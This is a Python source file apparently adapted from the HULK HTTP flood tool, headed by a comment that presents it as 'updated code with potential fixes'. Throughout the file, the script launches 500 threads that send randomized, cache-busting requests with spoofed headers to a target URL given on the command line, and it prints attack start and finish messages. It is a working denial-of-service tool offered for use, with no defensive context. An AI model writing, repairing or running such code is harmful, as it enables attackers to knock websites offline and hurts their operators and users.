# Your updated code with potential fixes
import urllib.request
import urllib.error
import sys
import threading
import random
import re

# Global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# Generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    # Add more user agents as needed
    return headers_useragents

# Generates a referer array
def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    # Add more referers as needed
    return headers_referers

# Builds random ASCII string
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str

def usage():
    print('---------------------------------------------------')
    print('USAGE: python hulk.py <url>')
    print('You can add "safe" after URL to auto-shutdown after DoS')
    print('---------------------------------------------------')

# HTTP request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', random.randint(110, 120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    try:
        urllib.request.urlopen(request)
    except (urllib.error.HTTPError, urllib.error.URLError) as e:
        set_flag(1)
        print('Response Code 500')
        code = 500
    else:
        inc_counter()
        urllib.request.urlopen(request)
    return code

# HTTP caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 500) and (safe == 1):
                    set_flag(2)
        except Exception as ex:
            print("Exception occurred in HTTPThread:", ex)

# Monitors HTTP threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) and (previous != request_counter):
                print("%d Requests Sent" % (request_counter))
                previous = request_counter
        if flag == 2:
            print("\n-- HULK Attack Finished --")

# Execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- HULK Attack Started --")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search('(https?\://)?([^/]*)/?.*', url)
        host = m.group(2)
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()

